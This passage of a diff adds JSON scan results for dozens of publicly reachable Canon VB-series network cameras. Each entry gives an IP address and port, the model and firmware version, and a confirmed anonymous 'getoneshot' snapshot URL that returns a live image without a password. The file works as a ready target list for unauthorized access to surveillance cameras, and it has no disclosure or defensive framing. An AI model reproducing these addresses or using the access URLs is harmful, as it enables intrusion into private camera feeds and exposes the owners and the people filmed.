+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 93746,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M600D Ver. 1.1.2",
+      "model": "VB-M600D",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://118.243.56.46:8001/-wvhttp-01-/getoneshot?image=img"
+  },
+  "210.190.201.222:8801": {
+    "host": "210.190.201.222",
+    "port": 8801,
+    "url": "http://210.190.201.222:8801/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://210.190.201.222:8801/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 3248,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.0.0",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://210.190.201.222:8801/-wvhttp-01-/getoneshot?image=img"
+  },
+  "166.144.40.18:80": {
+    "host": "166.144.40.18",
+    "port": 80,
+    "url": "http://166.144.40.18:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://166.144.40.18:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 161065,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H43 Ver. 1.2.9",
+      "model": "VB-H43",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://166.144.40.18:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "122.249.146.76:8093": {
+    "host": "122.249.146.76",
+    "port": 8093,
+    "url": "http://122.249.146.76:8093/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://122.249.146.76:8093/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 11447,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.0",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://122.249.146.76:8093/-wvhttp-01-/getoneshot?image=img"
+  },
+  "122.249.156.152:8080": {
+    "host": "122.249.156.152",
+    "port": 8080,
+    "url": "http://122.249.156.152:8080/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://122.249.156.152:8080/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 136572,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.1",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://122.249.156.152:8080/-wvhttp-01-/getoneshot?image=img"
+  },
+  "218.45.160.239:80": {
+    "host": "218.45.160.239",
+    "port": 80,
+    "url": "http://218.45.160.239:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://218.45.160.239:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 3260,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M641VE Ver. 1.0.0",
+      "model": "VB-M641VE",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://218.45.160.239:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "122.249.146.76:8092": {
+    "host": "122.249.146.76",
+    "port": 8092,
+    "url": "http://122.249.146.76:8092/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://122.249.146.76:8092/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 5243,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-C50i Ver. 3.2.77",
+      "model": "VB-C50",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://122.249.146.76:8092/-wvhttp-01-/getoneshot?image=img"
+  },
+  "122.249.156.152:8081": {
+    "host": "122.249.156.152",
+    "port": 8081,
+    "url": "http://122.249.156.152:8081/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://122.249.156.152:8081/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 118439,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.1",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://122.249.156.152:8081/-wvhttp-01-/getoneshot?image=img"
+  },
+  "202.208.150.241:8081": {
+    "host": "202.208.150.241",
+    "port": 8081,
+    "url": "http://202.208.150.241:8081/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://202.208.150.241:8081/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 30473,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-S905F Ver. 1.0.1",
+      "model": "VB-S905F",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://202.208.150.241:8081/-wvhttp-01-/getoneshot?image=img"
+  },
+  "153.142.72.163:5003": {
+    "host": "153.142.72.163",
+    "port": 5003,
+    "url": "http://153.142.72.163:5003/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://153.142.72.163:5003/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 3967,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.0.3",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://153.142.72.163:5003/-wvhttp-01-/getoneshot?image=img"
+  },
+  "125.206.33.49:8080": {
+    "host": "125.206.33.49",
+    "port": 8080,
+    "url": "http://125.206.33.49:8080/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://125.206.33.49:8080/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 3384,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.2.5",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://125.206.33.49:8080/-wvhttp-01-/getoneshot?image=img"
+  },
+  "153.156.166.84:80": {
+    "host": "153.156.166.84",
+    "port": 80,
+    "url": "http://153.156.166.84:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://153.156.166.84:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 22691,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.2.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://153.156.166.84:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "166.143.227.69:8000": {
+    "host": "166.143.227.69",
+    "port": 8000,
+    "url": "http://166.143.227.69:8000/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://166.143.227.69:8000/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 350414,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H43 Ver. 1.2.9",
+      "model": "VB-H43",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://166.143.227.69:8000/-wvhttp-01-/getoneshot?image=img"
+  },
+  "183.177.168.196:80": {
+    "host": "183.177.168.196",
+    "port": 80,
+    "url": "http://183.177.168.196:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://183.177.168.196:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 4359,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.2.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://183.177.168.196:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "218.219.195.166:8081": {
+    "host": "218.219.195.166",
+    "port": 8081,
+    "url": "http://218.219.195.166:8081/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://218.219.195.166:8081/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 52849,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M641VE Ver. 1.0.0",
+      "model": "VB-M641VE",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://218.219.195.166:8081/-wvhttp-01-/getoneshot?image=img"
+  },
+  "183.180.128.141:8002": {
+    "host": "183.180.128.141",
+    "port": 8002,
+    "url": "http://183.180.128.141:8002/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://183.180.128.141:8002/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 10360,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H610VE Ver. 1.1.0",
+      "model": "VB-H610VE",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://183.180.128.141:8002/-wvhttp-01-/getoneshot?image=img"
+  },
+  "183.180.128.141:8001": {
+    "host": "183.180.128.141",
+    "port": 8001,
+    "url": "http://183.180.128.141:8001/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://183.180.128.141:8001/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 17230,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H630VE Ver. 1.2.0",
+      "model": "VB-H630VE",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://183.180.128.141:8001/-wvhttp-01-/getoneshot?image=img"
+  },
+  "61.126.185.251:80": {
+    "host": "61.126.185.251",
+    "port": 80,
+    "url": "http://61.126.185.251:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://61.126.185.251:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 2694,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-C10R Ver. 3.0.25",
+      "model": "VB-C10R",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://61.126.185.251:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "121.117.163.103:8000": {
+    "host": "121.117.163.103",
+    "port": 8000,
+    "url": "http://121.117.163.103:8000/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://121.117.163.103:8000/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 72635,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.0.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://121.117.163.103:8000/-wvhttp-01-/getoneshot?image=img"
+  },
+  "183.77.176.35:80": {
+    "host": "183.77.176.35",
+    "port": 80,
+    "url": "http://183.77.176.35:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://183.77.176.35:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 41739,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.1",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://183.77.176.35:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "122.249.91.30:80": {
+    "host": "122.249.91.30",
+    "port": 80,
+    "url": "http://122.249.91.30:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://122.249.91.30:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 91718,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M740E Ver. 1.0.0",
+      "model": "VB-M740E",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://122.249.91.30:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "203.189.39.196:81": {
+    "host": "203.189.39.196",
+    "port": 81,
+    "url": "http://203.189.39.196:81/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://203.189.39.196:81/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 3279,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M741LE Ver. 1.0.0",
+      "model": "VB-M741LE",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://203.189.39.196:81/-wvhttp-01-/getoneshot?image=img"
+  },
+  "61.120.99.198:80": {
+    "host": "61.120.99.198",
+    "port": 80,
+    "url": "http://61.120.99.198:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://61.120.99.198:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 4729,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H43 Ver. 1.2.9",
+      "model": "VB-H43",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://61.120.99.198:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "203.189.39.196:82": {
+    "host": "203.189.39.196",
+    "port": 82,
+    "url": "http://203.189.39.196:82/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://203.189.39.196:82/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 3356,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M741LE Ver. 1.0.0",
+      "model": "VB-M741LE",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://203.189.39.196:82/-wvhttp-01-/getoneshot?image=img"
+  },
+  "218.45.5.71:80": {
+    "host": "218.45.5.71",
+    "port": 80,
+    "url": "http://218.45.5.71:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://218.45.5.71:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 5796,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.0",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://218.45.5.71:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "14.12.53.1:12432": {
+    "host": "14.12.53.1",
+    "port": 12432,
+    "url": "http://14.12.53.1:12432/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://14.12.53.1:12432/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 43746,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-C50iR Ver. 3.2.77",
+      "model": "VB-C50",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://14.12.53.1:12432/-wvhttp-01-/getoneshot?image=img"
+  },
+  "61.120.208.46:4080": {
+    "host": "61.120.208.46",
+    "port": 4080,
+    "url": "http://61.120.208.46:4080/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://61.120.208.46:4080/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 57972,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-C50iR Ver. 3.2.77",
+      "model": "VB-C50",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://61.120.208.46:4080/-wvhttp-01-/getoneshot?image=img"
+  },
+  "219.100.189.123:8081": {
+    "host": "219.100.189.123",
+    "port": 8081,
+    "url": "http://219.100.189.123:8081/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://219.100.189.123:8081/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 26234,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.1.1",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://219.100.189.123:8081/-wvhttp-01-/getoneshot?image=img"
+  },
+  "202.124.60.154:8081": {
+    "host": "202.124.60.154",
+    "port": 8081,
+    "url": "http://202.124.60.154:8081/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://202.124.60.154:8081/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 19794,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.1.0",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://202.124.60.154:8081/-wvhttp-01-/getoneshot?image=img"
+  },
+  "118.243.56.46:8002": {
+    "host": "118.243.56.46",
+    "port": 8002,
+    "url": "http://118.243.56.46:8002/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://118.243.56.46:8002/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 24857,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M700F Ver. 1.1.2",
+      "model": "VB-M700F",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://118.243.56.46:8002/-wvhttp-01-/getoneshot?image=img"
+  },
+  "153.142.11.156:80": {
+    "host": "153.142.11.156",
+    "port": 80,
+    "url": "http://153.142.11.156:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://153.142.11.156:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 5612,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.0.3",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://153.142.11.156:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "61.125.159.90:8080": {
+    "host": "61.125.159.90",
+    "port": 8080,
+    "url": "http://61.125.159.90:8080/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://61.125.159.90:8080/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 12082,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H630VE Ver. 1.2.0",
+      "model": "VB-H630VE",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://61.125.159.90:8080/-wvhttp-01-/getoneshot?image=img"
+  },
+  "202.124.60.154:8080": {
+    "host": "202.124.60.154",
+    "port": 8080,
+    "url": "http://202.124.60.154:8080/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://202.124.60.154:8080/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 46136,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.1.0",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://202.124.60.154:8080/-wvhttp-01-/getoneshot?image=img"
+  },
+  "153.125.104.78:8080": {
+    "host": "153.125.104.78",
+    "port": 8080,
+    "url": "http://153.125.104.78:8080/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://153.125.104.78:8080/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
